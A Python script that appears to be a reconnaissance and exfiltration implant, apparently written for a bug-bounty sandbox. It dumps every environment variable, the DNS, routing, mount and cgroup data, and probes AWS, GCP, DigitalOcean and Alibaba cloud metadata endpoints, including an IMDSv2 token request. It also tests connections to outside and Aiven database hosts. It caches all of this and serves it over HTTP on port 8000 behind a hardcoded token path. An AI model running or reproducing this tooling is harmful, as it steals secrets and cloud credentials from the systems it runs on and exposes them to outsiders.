import json, os, socket, threading, urllib.request
from http.server import BaseHTTPRequestHandler, HTTPServer

TOKEN = "r7xQ2kT9mV4bZ8wP"
CACHE = {"status": "warming-up"}
FQ = "falcon-bug-bounty-flag-pgsql-dev-sandbox.e.aivencloud.com"
PG = "pg-reaudit1-test12345323456-ae5b.l.aivencloud.com"

def tcp(target, port, timeout=3):
    try:
        s = socket.create_connection((target, port), timeout=timeout)
        s.settimeout(2)
        try:
            d = s.recv(64)
            first = d.hex() if d else "connect-ok-no-data"
        except Exception as e:
            first = "connect-ok-read:" + type(e).__name__
        s.close()
        return {"tcp": "ok", "first_bytes": first}
    except Exception as e:
        return {"tcp": type(e).__name__ + ": " + str(e)}

def http(url, headers=None, method="GET", timeout=2):
    try:
        class NR(urllib.request.HTTPRedirectHandler):
            def redirect_request(self, *a): return None
        op = urllib.request.build_opener(NR)
        req = urllib.request.Request(url, headers=headers or {}, method=method)
        r = op.open(req, timeout=timeout)
        return {"status": r.status, "body": r.read(300).decode("utf-8", "replace")}
    except urllib.error.HTTPError as e:
        try:
            body = e.read(300).decode("utf-8", "replace")
        except Exception:
            body = ""
        return {"status": e.code, "body": body}
    except Exception as e:
        return {"error": type(e).__name__ + ": " + str(e)}

def safe(p):
    try:
        return open(p).read()[:1000]
    except Exception as e:
        return type(e).__name__

def out(target):
    try:
        return socket.gethostbyname(target) + " resolved"
    except Exception as e:
        return type(e).__name__

def run_all():
    o = {}
    o["env"] = dict(os.environ)
    o["hostname"] = socket.gethostname()
    o["resolv_conf"] = safe("/etc/resolv.conf")
    o["route"] = safe("/proc/net/route")
    o["mounts"] = safe("/proc/self/mounts")
    o["cgroup"] = safe("/proc/self/cgroup")
    o["dns_falcon"] = out(FQ)
    o["dns_own_pg"] = out(PG)
    o["tcp_falcon_33046"] = tcp("129.213.46.149", 33046)
    o["tcp_own_pg_26247"] = tcp(PG, 26247)
    o["tcp_internet_1111_443"] = tcp("1.1.1.1", 443)
    o["tcp_imds_80"] = tcp("169.254.169.254", 80)
    o["http_imds_generic"] = http("http://169.254.169.254/")
    o["http_imds_aws_token"] = http("http://169.254.169.254/latest/api/token",
        {"X-aws-ec2-metadata-token-ttl-seconds": "21600"}, method="PUT")
    o["http_gcp_metadata"] = http("http://metadata.google.internal/computeMetadata/v1/",
        {"Metadata-Flavor": "Google"})
    o["http_do_metadata"] = http("http://169.254.169.254/metadata/v1.json")
    o["http_alibaba_metadata"] = http("http://100.100.100.200/latest/meta-data/")
    return o

def loop():
    while True:
        try:
            CACHE.update(run_all())
        except Exception as e:
            CACHE["loop_error"] = type(e).__name__ + ": " + str(e)
        threading.Event().wait(30)

class H(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == "/" + TOKEN:
            body = json.dumps(CACHE, default=str).encode()
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            self.wfile.write(body)
        else:
            self.send_response(404); self.end_headers()
    def log_message(self, *a): pass

threading.Thread(target=loop, daemon=True).start()
HTTPServer(("0.0.0.0", 8000), H).serve_forever()
